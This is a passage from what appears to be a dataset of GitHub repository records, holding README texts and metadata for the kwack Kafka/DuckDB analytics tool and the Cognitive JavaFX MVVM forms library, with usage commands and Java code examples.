'automation']",0,24.0,9.0,"[com.google.code.maven-replacer-plugin:replacer,maven-assembly-plugin,maven-clean-plugin,maven-compiler-plugin,maven-resources-plugin,org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-clean-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-dependency-plugin,org.apache.maven.plugins:maven-eclipse-plugin,org.apache.maven.plugins:maven-install-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:exec-maven-plugin]",0.0,7.0,2.0,4149,26.428571428571427,5.535135135135135,"['![Build INGenious Source Code -> https://github.com/ing-bank/INGenious/actions/workflows/maven.yml/badge.svg', 'Static Badge -> https://img.shields.io/badge/Version-1.0-%23FF6200', ':arrow_right: Getting started -> https://ing-bank.github.io/ingenious-doc/gettingstarted/', ':arrow_right: IDE -> https://ing-bank.github.io/ingenious-doc/knowyourframework/', ':arrow_right: Browser Testing -> https://ing-bank.github.io/ingenious-doc/browsertesting/', ':arrow_right: API Testing -> https://ing-bank.github.io/ingenious-doc/api/', ':arrow_right: Customizations -> https://ing-bank.github.io/ingenious-doc/customizations/', ':arrow_right: BDD Support -> https://ing-bank.github.io/ingenious-doc/bdd/', ':arrow_right: Test Plan -> https://ing-bank.github.io/ingenious-doc/testplan/', ':arrow_right: Integration -> https://ing-bank.github.io/ingenious-doc/ci/', ':arrow_right: License -> https://github.com/ing-bank/INGenious']",11
rayokota/kwack,master,"
# kwack - In-Memory Analytics for Kafka using DuckDB

[![Build Status][github-actions-shield]][github-actions-link]

[github-actions-shield]: https://github.com/rayokota/kwack/actions/workflows/build.yml/badge.svg?branch=master
[github-actions-link]: https://github.com/rayokota/kwack/actions

kwack supports in-memory analytics for Kafka data using DuckDB.

## Getting Started

Note that kwack requires Java 11 or higher. 

To run kwack, download a [release](https://github.com/rayokota/kwack/releases), unpack it.
Then change to the `kwack-${version}` directory and run the following to see the command-line options:

```bash
$ bin/kwack -h

Usage: kwack [-hV] [-t=<topic>]... [-p=<partition>]... [-b=<broker>]...
             [-m=<ms>] [-F=<config-file>] [-o=<offset>] [-k=<topic=serde>]...
             [-v=<topic=serde>]... [-r=<url>] [-q=<query>] [-a=<attr>]...
             [-d=<db>] [-X=<prop=val>]...
In-Memory Analytics for Kafka using DuckDB.
  -t, --topic=<topic>               Topic(s) to consume from and produce to
  -p, --partition=<partition>       Partition(s)
  -b, --bootstrap-server=<broker>   Bootstrap broker(s) (host:[port])
  -m, --metadata-timeout=<ms>       Metadata (et.al.) request timeout
  -F, --file=<config-file>          Read configuration properties from file
  -o, --offset=<offset>             Offset to start consuming from:
                                      beginning | end |
                                      <value>  (absolute offset) |
                                      -<value> (relative offset from end)
                                      @<value> (timestamp in ms to start at)
                                      Default: beginning
  -k, --key-serde=<topic=serde>     (De)serialize keys using <serde>
  -v, --value-serde=<topic=serde>   (De)serialize values using <serde>
                                    Available serdes:
                                      short | int | long | float |
                                      double | string | json | binary |
                                      avro:<schema|@file> |
                                      json:<schema|@file> |
                                      proto:<schema|@file> |
                                      latest (use latest version in SR) |
                                      <id>   (use schema id from SR)
                                      Default for key:   binary
                                      Default for value: latest
                                    The proto/latest/<id> serde formats can
                                    also take a message type name, e.g.
                                      proto:<schema|@file>;msg:<name>
                                    in case multiple message types exist
  -r, --schema-registry-url=<url>   SR (Schema Registry) URL
  -q, --query=<query>               SQL query to execute. If none is specified,
                                      interactive sqlline mode is used
  -a, --row-attribute=<attr>        Row attribute(s) to show:
                                      none
                                      rowkey (record key)
                                      ksi    (key schema id)
                                      vsi    (value schema id)
                                      top    (topic)
                                      par    (partition)
                                      off    (offset)
                                      ts     (timestamp)
                                      tst    (timestamp type)
                                      epo    (leadership epoch)
                                      hdr    (headers)
                                      Default: rowkey,ksi,vsi,par,off,ts,hdr
  -d, --db=<db>                     DuckDB db, appended to 'jdbc:duckdb:'
                                      Default: :memory:
  -x, --skip-bytes=<bytes>          Extra bytes to skip when deserializing with
                                      an external schema
  -X, --property=<prop=val>         Set configuration property.
  -h, --help                        Show this help message and exit.
  -V, --version                     Print version information and exit.
```

kwack shares many command-line options with [kcat](https://github.com/edenhill/kcat) (formerly kafkacat).
In addition, a file containing configuration properties can be used.  The available configuration properties 
are listed [here](https://github.com/rayokota/kwack/blob/master/src/main/java/io/kcache/kwack/KwackConfig.java).

Simply modify `config/kwack.properties` to point to an existing Kafka broker and Schema
Registry. Then run the following:

```bash
# Run with properties file
$ bin/kwack -F config/kwack.properties
```

Starting kwack is as easy as specifying a Kafka broker, topic, and Schema Registry URL:

```bash
$ bin/kwack -b mybroker -t mytopic -r http://schema-registry-url:8081
Welcome to kwack!
Enter ""!help"" for usage hints.

      ___(.)>
~~~~~~\___)~~~~~~

jdbc:duckdb::memory:>
```

When kwack starts, it will enter interactive mode, where you can enter SQL queries 
to analyze Kafka data.  For non-interactive mode, specify a query on the command line:

```bash
$ bin/kwack -b mybroker -t mytopic -r http://schema-registry-url:8081 -q ""SELECT * FROM mytopic""
```

The output of the above command will be in JSON, and so can be piped to other commands like jq.

One can load multiple topics, and then perform a query that joins the resulting tables on a common 
column:

```bash
$ bin/kwack -b mybroker -t mytopic -t mytopic2 -r http://schema-registry-url:8081 -q ""SELECT * FROM mytopic JOIN mytopic2 USING (col1)""
```

One can convert Kafka data into Parquet format by using the COPY commmand in DuckDB:

```bash
$ bin/kwack -b mybroker -t mytopic -r http://schema-registry-url:8081 -q ""COPY mytopic to 'mytopic.parquet' (FORMAT 'parquet')""
```

If not using Confluent Schema Registry, one can pass an external schema:

```bash
$ bin/kwack -b mybroker -t mytopic -v mytopic=proto:@/path/to/myschema.proto
```

For a given schema, kwack will create DuckDB columns based on
the appropriate Avro, Protobuf, or JSON Schema as follows:

|Avro | Protobuf | JSON Schema | DuckDB |
|-----|----------|-------------|--------|
|boolean | boolean | boolean | BOOLEAN |
|int | int32, sint32, sfixed32 || INTEGER |
|| uint32, fixed32 || UINTEGER |
|long | int64. sint64, sfixed64 | integer | BIGINT |
|| uint64, fixed64 || UBIGINT |
|float | float || FLOAT |
|double | double | number | DOUBLE |
|string | string | string | VARCHAR |
|bytes, fixed | bytes || BLOB |
|enum | enum| enum | ENUM |
|record | message | object | STRUCT |
|array | repeated | array | LIST |
|map | map || MAP |
|union | oneof | oneOf,anyOf | UNION |
|decimal | confluent.type.Decimal || DECIMAL |
|date | google.type.Date || DATE |
|time-millis, time-micros | google.type.TimeOfDay || TIME |
|timestamp-millis ||| TIMESTAMP_MS |
|timestamp-micros ||| TIMESTAMP |
|timestamp-nanos | google.protobuf.Timestamp || TIMESTAMP_NS |
|duration | google.protobuf.Duration || INTERVAL |
|uuid ||| UUID |

For more on how to use kwack, see this [blog](https://yokota.blog/2024/07/11/in-memory-analytics-for-kafka-using-duckdb/).
",12,7,10,apache-2.0,5.0,"['kwack', 'analytics', 'kafka', 'using', 'duckdb', 'kwack', 'support', 'analytics', 'kafka', 'data', 'using', 'duckdb', 'getting', 'started', 'note', 'kwack', 'requires', 'java', 'higher', 'run', 'kwack', 'download', 'release', 'unpack', 'change', 'directory', 'run', 'following', 'see', 'option', 'kwack', 'share', 'many', 'option', 'kcat', 'formerly', 'kafkacat', 'addition', 'file', 'containing', 'configuration', 'property', 'used', 'available', 'configuration', 'property', 'listed', 'simply', 'modify', 'point', 'existing', 'kafka', 'broker', 'schema', 'registry', 'run', 'following', 'starting', 'kwack', 'easy', 'specifying', 'kafka', 'broker', 'topic', 'schema', 'registry', 'url', 'kwack', 'start', 'enter', 'interactive', 'mode', 'enter', 'sql', 'query', 'analyze', 'kafka', 'data', 'mode', 'specify', 'query', 'command', 'line', 'output', 'command', 'json', 'piped', 'command', 'like', 'jq', 'one', 'load', 'multiple', 'topic', 'perform', 'query', 'join', 'resulting', 'table', 'common', 'column', 'one', 'convert', 'kafka', 'data', 'parquet', 'format', 'using', 'copy', 'commmand', 'duckdb', 'using', 'confluent', 'schema', 'registry', 'one', 'pas', 'external', 'schema', 'given', 'schema', 'kwack', 'create', 'duckdb', 'column', 'based', 'appropriate', 'avro', 'protobuf', 'json', 'schema', 'follows', 'protobuf', 'json', 'schema', 'duckdb', 'boolean', 'boolean', 'boolean', 'integer', 'uinteger', 'integer', 'bigint', 'ubigint', 'float', 'float', 'double', 'number', 'double', 'string', 'string', 'varchar', 'fixed', 'byte', 'blob', 'enum', 'enum', 'message', 'object', 'struct', 'repeated', 'array', 'list', 'map', 'map', 'oneof', 'oneof', 'anyof', 'union', 'decimal', 'date', 'time', 'timestamp', 'interval', 'uuid', 'use', 'kwack', 'see', 'blog']","['kwack', 'schema', 'kafka', 'duckdb', 'using']",0,0,0,"['kwack', 'analytics', 'kafka', 'use', 'duckdb', 'get', 'start', 'run', 'property', 'file']",3,"['kwack', 'analytics', 'kafka', 'use', 'duckdb']",7,18.0,1.0,"[com.github.os72:protoc-jar-maven-plugin,com.github.spotbugs:spotbugs-maven-plugin,maven-surefire-plugin,org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-release-plugin,org.apache.maven.plugins:maven-source-plugin,org.sonatype.plugins:nexus-staging-maven-plugin]",0.0,1.0,0.0,7233,38.04545454545455,4.82078853046595,"['release -> https://github.com/rayokota/kwack/releases', 'kcat -> https://github.com/edenhill/kcat', 'here -> https://github.com/rayokota/kwack/blob/master/src/main/java/io/kcache/kwack/KwackConfig.java', 'blog -> https://yokota.blog/2024/07/11/in-memory-analytics-for-kafka-using-duckdb/', 'port']",5
carldea/cognitive,main,"🚧 Work in progress 🚧
Please view the Wiki [here](https://github.com/carldea/cognitive/wiki)
# What's new? [Release notes](https://github.com/carldea/cognitive/releases)
- [1.5.0](https://github.com/carldea/cognitive/releases/tag/release%2F1.5.0) 10/30/2024 - New support to get view model from a JFXNode record, new ways to monitor change and invoke validators on change.
- [1.4.0](https://github.com/carldea/cognitive/releases/tag/release%2F1.4.0) 10/18/2024 - New support to get properties as common JavaFX properties. Avoids down casting.
- [1.3.0](https://github.com/carldea/cognitive/releases/tag/release%2F1.3.0) 09/04/2024 - Enums for property name lookups. Added SLF4J, JUnit5, began unit tests.
- [1.2.0](https://github.com/carldea/cognitive/releases/tag/release%2F1.2.0) 08/05/2024 - Validators support multiple validation messages.
- [1.1.0](https://github.com/carldea/cognitive/releases/tag/release%2F1.1.0) 06/28/2024 - `PropertyIdentifier` type objects to reference properties.
- [1.0.0](https://github.com/carldea/cognitive/releases/tag/release%2F1.0.0) 05/30/2024 - Initial Release. `FXMLMvvmLoader`, `SimpleViewModel`, `ValidationViewModel`, `Validator`(s).

# Cognitive
A lightweight JavaFX (21+) forms framework based on the MVVM UI architecture pattern.

View Model(s) maintain the state of a view (Form) and, in principle, should contain a controller's presentation logic.
MVVM allows the developer to test the presentation logic without having to wire up a JavaFX controller during runtime.

## Quick Start
To use Cognitive in your project, download and install Java 21+ JDK. The library depends on JavaFX 21+
To see the demo's code see [Form demo](https://github.com/carldea/cognitive/tree/main/src/test/java/org/carlfx/cognitive/test/demo)

*Gradle:*
```gradle
implementation 'org.carlfx:cognitive:1.5.0'
```

*Maven:*
```xml
<dependency>
    <groupId>org.carlfx</groupId>
    <artifactId>cognitive</artifactId>
    <version>1.5.0</version>
</dependency>
```

A project using Java Modules (JPMS) will want to do the following in the consuming module:
```java

requires org.carlfx.cognitive;

// open for FXML loaders
opens com.mycompany.myproject.controller to javafx.fxml, org.carlfx.cognitive;

```
As you can see, the opens allow FXML and Controller code to inject view models and UI controls using reflection.

# Introduction
Software developers creating form based applications will inevitably stumble across the single most important UI architectural design pattern [Model View Controller](http://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller) or **MVC** in short. This concept has paved the way for many frameworks which provide a good (acceptable) [separation of concerns.](http://en.wikipedia.org/wiki/Separation_of_concerns)

However, there are drawbacks to the MVC pattern (especially in JavaFX). One main drawback is that the controller layer can be difficult (if not impossible) to test. It is especially concerning when you are JavaFX developer who has worked with FXML and controller classes.

The pattern helps avoid coupling UI components, models (data) and presentation logic within a controller class. Because UI components are available during runtime it is difficult to test interactions (presentation logic) between the model and UI layers.

**So, what is a solution?**

You guessed it! The **MVVM** UI architecture pattern.

## What is MVVM?

MVVM is an architectural pattern that isolates the business logic/back-end data(Presentation Logic) from the view (UI code). Its goal is to simplify user interface development. According to Wikipedia, the [MVVM](https://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93viewmodel) is a variation of [Martin Fowler](https://en.wikipedia.org/wiki/Martin_Fowler_(software_engineer))'s perspective of the [Presentation Model design pattern](https://martinfowler.com/eaDev/PresentationModel.html).

Next, let's see how to apply the MVVM UI pattern to an existing JavaFX Application

# Converting JavaFX MVC to the MVVM UI pattern

Before I show you how to convert a JavaFX MVC structure, let's compare the differences between MVC and the MVVM UI architecture patterns.

## MVC (Model View Controller)
Typically MVC is used in Java Swing or JavaFX UI form type apps.

JavaFX is MVC-based, where developers often follow the [Supervising Controller Pattern](https://martinfowler.com/eaaDev/SupervisingPresenter.html). An excerpt describing the controller's ability to manipulate the view with more complex view logic:

> ""Supervising Controller uses a controller both to handle input response but also to manipulate the view to handle more complex view logic. It leaves simple view behavior to the declarative system, intervening only when effects are needed that are beyond what can be achieved declaratively.""

In the case of JavaFX, the declarative part would be FXML & CSS (XML representing the View).

JavaFX can also bind ([Properties API](https://dev.java/learn/javafx/properties/)) UI controls and listeners to synchronize the model data. While it is convenient to do this inside a controller(Presenter) class, the code is tightly coupled regarding presentation logic, (complex) view logic, and (possibly) business logic, making code difficult to maintain, debug, and test.

It is difficult to test especially when many UI controls are realized (dependency injected) during runtime, such as `@FXML` annotated UI controls inside controller classes.

![mvc-ui-pattern](https://github.com/carldea/cognitive/assets/1594624/b8d811a2-cab6-4ac4-aa0e-5778a03e0d0b)

Now, let's look at the MVVM pattern and how it differs.

## MVVM (Model View ViewModel)
The MVVM UI pattern is a variation of the [Presentation Model Pattern](https://martinfowler.com/eaaDev/PresentationModel.html). Both MVVM and Presentation Model pattern both achieve the separation of the **View** and the **Model**. An excerpt from Martin Fowler's section on **When to use it?**
> ""Presentation Model allows you to write logic completely independent of the views used for display. You also do not need to rely on the view to store state.""

What's important is that the `ViewModel` manages the state. Later, we'll look at how to bind data between the View and ViewModel to synchronize model data.

The following is how MVVM is normally depected:

![mvvm-ui-pattern](https://github.com/carldea/cognitive/assets/1594624/6e290bc4-2b5e-475f-991f-291b196e207f)

As you will notice, the **model** does not update the view layer, which he main difference between MVVM and MVC.

The main advantage is testing **presentation logic** separately from the UI form and its associated JavaFX Controller class.

Now that you've seen the pros and cons between MVC and MVVM how do we conceptually convert a JavaFX MVC UI form into the MVVM pattern?

**Hint:**  Refactor (pull out) presentation logic and business logic away from JavaFX controllers into ViewModels or Model (services).

## Converting a JavaFX MVC Form UI using the MVVM pattern
Below is a conceptual way to think of JavaFX using the MVVM UI pattern.

Cognitive is an un-opinionated library that let's you to refactor things at your own pace. As you get comfortable, you'll notice that JavaFX controller classes contain less code where presentation logic is move off to the ViewModels.

![javafx-mvvm-ui-pattern](https://github.com/carldea/cognitive/assets/1594624/aa922411-e4fb-456a-93bc-6f8c7a333ad7)


As shown above, you can treat the JavaFX FXML & Controller class as the **View**, and the Model will remain the same. The only difference is that the ViewModels will contain much of the state of the UI form and presentation logic. The objective is to make the view very stupid.

Now that you know conceptually, let's look at a code example of an MVC-style controller with a save operation.

### This is a typical controller without the use of a view model.
Below is an example of how a UI form is about to save data.
```java
/**
 * User clicks on save button to save contact information.
 * @param ae event 
 */
@FXML
private void saveAction(ActionEvent ae) {
   // copy user's input
   String firstName = firstNameTextField.getText();
   String lastName = lastNameTextField.getText();
   
   // validate user's input
   // if valid write to database and reset ui.
   // db.write(new Person(firstName, lastName));

}
```
Now, let's look at how to use a view model in a controller class.

### Using ValidationViewModels in a controller
Using view models, you can have presentation logic or business logic. When testing presentation logic, you can populate a view model with the correct values without modifying the UI. Remember, a view model does not contain any UI controls. Shown below is an example of using a view model.

```java

@FXML
private void initialize() {
   firstNameTextField.textProperty().bidirectionalBind(personViewModel.getProperty(FIRST_NAME));
   lastNameTextField.textProperty().bidirectionalBind(personViewModel.getProperty(LAST_NAME));
}

@FXML
private void saveAction(ActionEvent ae) {
    personViewModel.save(); // validates
    if (personViewModel.hasErrorMsgs()) {
       // apply messages to badges or decorate control for fields or global messages.  
    } else {
       // view model get model values and has logic to persist data.
       String firstName = personViewModel.getValue(FIRST_NAME);
       String lastName = personViewModel.getValue(LAST_NAME);
       // personViewModel.writePerson(new Person(firstName, lastName)); 
    }
}
```
Above you can see there are 4 steps to using View Models:

1. **Binding** - Bind JavaFX controls and their properties to the view model's properties (property value layer).
2. **Validation** - Upon `saveAction()` method perform a view model's `save()` method (which calls the `validate()` method)
3. **Error Messages** - Check if there are any error messages if so, these can be applied to controls for user feedback.
4. **Model Values** - Once you have **valid** values (model value layer) the code calls to view model's `.getValue()` method to return raw values.
   NOTE: Think of a view model with **two layers** a **Property Values** and **Model Values**. ValidationViewModel`'s save
   Now that you see, much of the work uses view models instead of methods or UI code inside the controller class. The developer aims to remove state and presentation logic from the controller class.

Let's look at the two main implementations of the ViewModel interface SimpleViewModel and ValidationViewModel.

## `SimpleViewModel`
Let's start by creating a `SimpleViewModel` with one property with a String such as a first name. The objective is
To create a JavaFX text field and bind the value with a view model's property.

To bind properties do the following:
```java
final String FIRST_NAME = ""firstName"";

// A text field
var firstNameTextField = new TextField();

// Create a 
var personVm = new SimpleViewModel()
        .addProperty(FIRST_NAME, """");

// Bidirectional bind of the first name property and text field's text property.
firstNameTextField.textProperty().bidirectional(personVm.getProperty(FIRST_NAME));

// Set view model property value.
personVm.setPropertyValue(FIRST_NAME, ""Fred"");

// Output Text field's text property
System.out.println(""First name = "" + firstNameTextField.getText());
```

Output:

```text
First name = Fred
```
As you can see whenever a user enters text into the text field (`TextField`) the view model's property (first name) gets populated and visa-versa.

Usually if you have a UI Form that has read-only or no validation needed a `SimpleViewModel` can be used. A form controls bound to properties on a view model you can call the `reset()` method to copy initial model values back into the property values, thus clearing the screen. The `save()` method
will copy the property values into the model values layer. For simple UIs you can validate fields manually.

## `ValidationViewModel`

Next, let's look at ValidationViewModel(s). These allow the developer to add validation to properties. The following example
shows you how to create properties and add validators. These use cases are typically when a user is about to save information. Here they would need to validate before obtaining model values. New in version 1.3.0 are **Enums** as property names!

```java
public enum PersonField {
    FIRST_NAME(""First Name""),
    LAST_NAME(""Last Name""),
    AGE(""Age""),
    PHONE(""Phone""),
    HEIGHT(""Height""),
    COLORS(""Colors""),
    FOODS(""Foods""),
    THING(""thing""),
    MPG(""Mpg""),
    CUSTOM_PROP(""Custom Prop"");

    public final String name;
    PersonField(String name){
        this.name = name;
    }
}

var personVm = new ValidationViewModel()
        .addProperty(FIRST_NAME, """")
        .addValidator(FIRST_NAME, FIRST_NAME.name(), (ReadOnlyStringProperty prop, ViewModel vm) -> {
            if (prop.isEmpty().get()) {
                return new ValidationMessage(FIRST_NAME, MessageType.ERROR, ""${%s} is required"".formatted(FIRST_NAME));
            }
            return VALID;
        })
        // Adding multiple validation messages
        .addValidator(FIRST_NAME, FIRST_NAME.name(), (ReadOnlyStringProperty prop, ValidationResult validationResult, ViewModel viewModel) -> {
            if (prop.isEmpty().get() || prop.isNotEmpty().get() && prop.get().length() < 3) {
                validationResult.error(""${%s} must be greater than 3 characters."".formatted(FIRST_NAME));
            }
            String firstChar = String.valueOf(prop.get().charAt(0));
            if (firstChar.equals(firstChar.toLowerCase())) {
                validationResult.error(""${%s} first character must be upper case."".formatted(FIRST_NAME));
            }
        })
        .addProperty(PHONE, ""111-1111111"")
        .addValidator(PHONE, PHONE.name(), (ReadOnlyStringProperty prop, ValidationResult validationResult, ViewModel vm) -> {
            String ph = prop.get();
            Pattern pattern = Pattern.compile(""([0-9]{3}\\-[0-9]{3}\\-[0-9]{4})"");
            Matcher matcher = pattern.matcher(ph);
            if (!matcher.matches()) {
                validationResult.error(""${%s} must be formatted XXX-XXX-XXXX. Entered as %s"".formatted(PHONE, ph);
            }
        });

// validate view model
personVm.validate();

if (personVm.hasErrors()) {
   for (ValidationMessage vMsg : personVm.getValidationMessages()) {
      System.out.println(""msg Type: %s errorcode: %s, msg: %s"".formatted(vMsg.messageType(), vMsg.errorCode(), vMsg.interpolate(personVm)) );
   }
}

```
Output:

```text
msg Type: ERROR errorcode: -1, msg: First Name is required
msg Type: ERROR errorcode: -1, msg: First Name must be greater than 3 characters.
msg Type: ERROR errorcode: -1, msg: Phone Number must be formatted XXX-XXX-XXXX. Entered as 111-1111111

```
Above you'll notice the first name field is required and must be more than 3 characters. The phone number is formatted incorrectly.

As each validation message contains a property of the field in question the code can create decorators or badges affixed on a UI control to allow the user to see the error or warning.
```java
ValidationMessage vMsg = ...;
Label firstNameError = ...;
if (FIRST_NAME.equals(vMsg.propertyName())) {
    firstNameError.setText(vMsg.message());
}

```
Now let's fix the validation issues but instead of calling `validate()` you should call `save()`. A `ValidatationViewModel` overrides the `SimpleViewModel`'s `save()` method.

The `save()` method essentially copies property values into the model value layer. Since a call to the `validate()` method happens before the `save()` method, property values will not be copied when errors occur.

```java
personVm.setPropertyValue(FIRST_NAME, ""Fred"");
personVm.setPropertyValue(PHONE, ""123-867-5309"");
personVm.save();

```

The correct thing to do is obtain the view model's model values by calling the following:

```java
if (personVm.hasErrorMsgs()) {
   return;
}
// Valid!
// Obtain valid values from the view model.
String validFirstName = personVm.getValue(FIRST_NAME); // You should not use personVm.getPropertyValue(FIRST_NAME);

// Write to database 
db.write(...);

```
You can think of the property values of a view model used for the form ui and the model values used on the backend.

## How to inject view models into JavaFX controllers?

When creating JavaFX controller classes you can add view models by using the annotation as follows:

```java
// ... A controllers instance variables

@InjectViewModel
SimpleViewModel personViewModel;

```
When you've created a FXML (view) and a controller you must use the `FXMLMvvmLoader.make()` facility.

```java
Config config = ...;
JFXNode<Pane, PersonController> personJFXNode = FXMLMvvmLoader.make(config);
Pane personPane = personJFXNode.node();
PersonController personController = personJFXNode.controller();
// perform work

```
## Demo - Account Creation Form

Here's a demo UI form without values. As a user types into fields, the **validator** for populating the form will update the submit button state. If any fields are not populated, the save button will be disabled.

When pressing the submit button the validation behavior occurs afterwards. To see the demo's code see [Form demo](https://github.com/carldea/cognitive/tree/main/src/test/java/org/carlfx/cognitive/test/demo)

![demo1](https://github.com/carldea/cognitive/assets/1594624/320c19f2-6545-4f43-8762-522ec0100b93)

Input in error (after save to validate)

<img width=""432"" alt=""demo2"" src=""https://github.com/carldea/cognitive/assets/1594624/069d2af3-fd24-469b-88a2-2cc28d08d2ac"">

When the submit is pressed show the overlay icons for each field with an error.

<img width=""595"" alt=""demo3"" src=""https://github.com/carldea/cognitive/assets/1594624/ced72d75-6681-4d42-a5c8-974ea70cab6f"">

As you can see the user entered an initial character as an upper case 'F' only one error message alerts user that it must be 3 characters or more. With the new support of multiple error messages when using validator let show multiple messages related to the first name field.

Here are the following requirements or validation rules for First Name:
* Must not be blank
* Must be greater than 3 characters
* First character must be upper case

Let's enter one lowercase character into the First Name field and click on submit to evaluate error messages.
Shown below is the new support for multiple validation messages using ConsumerValidators.

<img width=""594"" alt=""Screenshot 2024-08-05 at 2 37 32 PM"" src=""https://github.com/user-attachments/assets/63478b27-2d7c-4017-862d-fea2bef45b32"">

Above you will notice the first name field the user entered one lowercase 'f' character getting 2 validation messages.
To see how to add multiple validation messages shown below is a `StringConsumerValidator` for the first name field.

```java
viewModel.addValidator(FIRST_NAME, ""First Name"", (ReadOnlyStringProperty prop, ValidationResult validationResult, ViewModel viewModel) -> {
   if (prop.isEmpty().get() || prop.isNotEmpty().get() && prop.get().length() < 3) {
      validationResult.error(FIRST_NAME, ""${%s} must be greater than 3 characters."".formatted(FIRST_NAME));
   }
   String firstChar = String.valueOf(prop.get().charAt(0));
   if (firstChar.equals(firstChar.toLowerCase())) {
       validationResult.error(FIRST_NAME, ""${%s} first character must be upper case."".formatted(FIRST_NAME));
   }
});
```

Now let's add correct data with valid input.

<img width=""488"" alt=""demo4"" src=""https://github.com/carldea/cognitive/assets/1594624/66c147a1-abc6-4ca7-b018-a4b6ba8b545c"">

# New Features
Here are new features to simplify code in certain scenarios.

- Updating the view model after JFXNode object is FXML loaded. `JFXNode`'s `updateViewModel()` method.
- Getting the view model after JFXNode object is FXML loaded. `JFXNode`'s `getViewModel()` method.
- Running a code block when a property has changed. `ViewModel`'s `.doOnChange()` method. 
- Validate on change runs validators based on a property change. `ViewModel`'s
- Determine if Form is invalid. The `ValidationViewModel`'s `onInvalid()` method.
- Determine if Form is valid. `ValidationViewModel`'s `onValid()` method.

## `JFXNode`'s `updateViewModel()`
After calling the `FXMLMvvmLoader.make()` method a JFXNode object is returned representing the JavaFX Node and a Controller. Contained in the JFXNode (record) is a way to update the properties of a view model injected into the controller as shown in the code snippet below:
```java
JFXNode<Pane, AccountCreateController> jfxNode = FXMLMvvmLoader.make(config);

//  Modify a view model AFTER UI form was created and loaded.
jfxNode.updateViewModel(""accountViewModel"", (viewModel) ->
   viewModel.setPropertyValue(EMAIL, ""test123""));
```
Above your notice the `updateViewModel()` method takes the variable name inside the controller and a lambda containing the view model to be modified.

## `JFXNode`'s `getViewModel()`
After calling the `FXMLMvvmLoader.make()` method a JFXNode object is returned representing the JavaFX Node and a Controller. Contained in the JFXNode (record) is a way to get a view model previously injected into the controller as shown in the code snippet below:
```java
JFXNode<Pane, AccountCreateController> jfxNode = FXMLMvvmLoader.make(config);

//  Another way to modify a view model AFTER UI form was loaded.
Optional<AccountViewModel> accountViewModel = jfxNode.getViewModel(""accountViewModel"");

```
Above your notice the `getViewModel()` method takes the variable name and returns an `Optional` instance.

## `ViewModel`'s `.doOnChange()`
Did you ever just want to run a code block when a property value has changed? Now you can with the following:
```java
// fields change fire a validation
accountViewModel.doOnChange(()->{
       accountViewModel.validate();
}, FIRST_NAME, LAST_NAME, EMAIL);
```
Above you'll notice a lambda (Runnable) to be executed when the properties first name, last name and email property values change.

## Validate when a property changes. `ViewModel`'s `validateOnChange()` method.
When a property value has changed its validators get run and any validation messages will be passed to help update the UI. Below is an example of decorating an icon overlay on the first name field to provide user feedback of the error.
```java
// Does not decorate field initially. As user types validation occurs for field.
accountViewModel.validateOnChange(FIRST_NAME, (validationMessages) -> {
    // clear decoration UI code.
    firstNameTooltip.setText("""");
    firstNameErrorOverlay.setVisible(!validationMessages.isEmpty());

    // process each message owned by Field
    validationMessages.forEach(validationMessage -> {
       // show overlay and update tooltip
       accountViewModel.updateErrors(validationMessage);

       String message = validationMessage.interpolate(accountViewModel);

       // concatenate. Update UI
       firstNameTooltip.setText(firstNameTooltip.getText() + message + ""\n"");
    });
});
```
Above you'll notice it clears the tooltip and error overlay, then it concatenates the error messages to be shown to the user.

## The invalid property of a ValidationViewModel. `ValidationViewModel`'s `invalidProperty()` method
The invalid property detects (true) when there are validation messages otherwise it is false. This is often used to validate the whole form and disabling or enabling a save button as shown below.

```java
// button disable property is bound to invalid property.
submitButton.disableProperty().bind(accountViewModel.invalidProperty());
```
Above you'll notice a JavaFX Button's **disable** property is bound to the **invalid** property.
Also, this gets set based on the following code: 

```java
// fields change fire a validation
accountViewModel.doOnChange(()-> {
    accountViewModel.validate();
}, FIRST_NAME, LAST_NAME, EMAIL);
```
When validate is run, the error messages are collected (greater than zero) the invalid property gets set to true.

## The valid property of a ValidationViewModel  `ValidationViewModel`'s `validProperty()` method
After a validation view model's `validate()` or `save()` method is called you can check if there are zero validation messages or not as shown below.

```java
// validate form
accountViewModel.validate();

// is valid
if (accountViewModel.validProperty().get()) {
   // success!!!
}
```


# References
The following are links on the topic of UI/UX and Patterns:
* [GUI Architectural Patterns by Martin Fowler](https://martinfowler.com/eaaDev/uiArchs.html) - Model View Controller, Model-View-Presenter
* [Flow Synchronization Pattern](https://martinfowler.com/eaaDev/FlowSynchronization.html) - How to synch data between UI form and domain objects.
* [Separated Presentation](https://martinfowler.com/eaaDev/SeparatedPresentation.html) - Separating presentation and business logic code in separate layers.
* [JavaFX Forms Framework](https://carlfx.wordpress.com/2009/07/29/javafx-forms-framework-part-1/)",6,0,5,apache-2.0,5.0,"['work', 'progress', 'please', 'view', 'wiki', 'new', 'release', 'note', 'new', 'support', 'get', 'view', 'model', 'jfxnode', 'record', 'new', 'way', 'monitor', 'change', 'invoke', 'validators', 'change', 'new', 'support', 'get', 'property', 'common', 'javafx', 'property', 'avoids', 'casting', 'enums', 'property', 'name', 'lookup', 'added', 'began', 'unit', 'test', 'validators', 'support', 'multiple', 'validation', 'message', 'type', 'object', 'reference', 'property', 'initial', 'release', 'cognitive', 'lightweight', 'javafx', 'form', 'framework', 'based', 'mvvm', 'ui', 'architecture', 'pattern', 'view', 'model', 'maintain', 'state', 'view', 'form', 'principle', 'contain', 'controller', 'presentation', 'logic', 'mvvm', 'allows', 'developer', 'test', 'presentation', 'logic', 'without', 'wire', 'javafx', 'controller', 'runtime', 'quick', 'start', 'use', 'cognitive', 'project', 'download', 'install', 'java', 'jdk', 'library', 'depends', 'javafx', 'see', 'demo', 'code', 'see', 'form', 'demo', 'gradle', 'maven', 'project', 'using', 'java', 'module', 'jpms', 'want', 'following', 'consuming', 'module', 'see', 'open', 'allow', 'fxml', 'controller', 'code', 'inject', 'view', 'model', 'ui', 'control', 'using', 'reflection', 'introduction', 'software', 'developer', 'creating', 'form', 'based', 'application', 'inevitably', 'stumble', 'across', 'single', 'important', 'ui', 'architectural', 'design', 'pattern', 'model', 'view', 'controller', 'mvc', 'short', 'concept', 'paved', 